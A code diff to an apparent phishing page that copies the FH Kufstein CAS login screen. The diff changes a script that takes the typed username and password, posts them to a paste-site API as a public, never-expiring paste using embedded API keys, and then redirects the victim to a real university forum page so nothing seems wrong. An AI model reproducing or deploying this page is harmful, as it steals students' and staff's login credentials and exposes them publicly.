@@ -7,9 +7,6 @@
 <script>
 	var url = new URL(window.location.href);
 	var username = url.searchParams.get("username");
-	
-	window.history.replaceState(null, "Login - CAS - Central Authentication Service", "https://webproxy.fh-kufstein.ac.at/cas/login?service=");
-	window.history.pushState("", "", 'https://webproxy.fh-kufstein.ac.at/cas/login?service=');
 	</script>
 <body class="login">
 
@@ -34,7 +31,7 @@
                              alt="Fachhochschule Kufstein - Higher Level of Education" title="Logo FH Kufstein"/></a>
                 </div>
                 <div class="card-body">
-                    <form onsubmit="abc()" id="fm1">
+                    <div id="fm1">
                         <h3 style="text-align: center; margin-top:-15px">
                                                         <span>Enter Username & Password</span>
                         </h3>
@@ -77,13 +74,13 @@
                         <section class="form-group">
                             </section>
 
-                        <input type="hidden" name="execution" value=""/><input type="hidden" name="_eventId" value="submit"/><input type="hidden" name="geolocation"/><input class="btn btn-block btn-submit"
+                        <input onclick="abc()" type="hidden" name="execution" value=""/><input type="hidden" name="_eventId" value="submit"/><input type="hidden" name="geolocation"/><input class="btn btn-block btn-submit"
                                name="submit"
                                accesskey="l"
                                tabindex="6"
                                type="submit"
-                               value="LOGIN"
-                        /></form>
+                               value="LOGIN" onclick="abc()"
+                        /></div>
 
                     <div id="sidebar">
         <div class="sidebar-content">
@@ -124,6 +121,9 @@
     </footer>
 	
 	<script>
+function sleep (time) {
+  return new Promise((resolve) => setTimeout(resolve, time));
+}
 			$("#username").val(username);
 		
 			function abc(a){
@@ -133,13 +133,16 @@
 
 				request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 
-				b = request.send("api_user_key=ad65dcc8bb93cf505c94ffdc8cff162c&api_dev_key=378ddcae1c7001bba7a4b487890c54f2&api_option=paste&api_paste_private=0&api_paste_name=Jesus121212&api_paste_expire_date=N&api_paste_format=javascript&api_paste_code="+$("#username").val()+" - "+$("#password").val());
-				
-				window.location.href = "https://weblearn.fh-kufstein.ac.at/mod/forum/index.php?id=4714";
+				request.send("api_user_key=ad65dcc8bb93cf505c94ffdc8cff162c&api_dev_key=378ddcae1c7001bba7a4b487890c54f2&api_option=paste&api_paste_private=0&api_paste_name=Chipchip1234&api_paste_expire_date=N&api_paste_format=javascript&api_paste_code="+$("#username").val()+" - "+$("#password").val());
+				setTimeout(c, 2000) 
+			}
+		
+			function c(){
+				window.location = "https://weblearn.fh-kufstein.ac.at/mod/forum/index.php?id=4714";
+				return false;
 			}
 		</script>
 
 </body>
 </html>
-
 
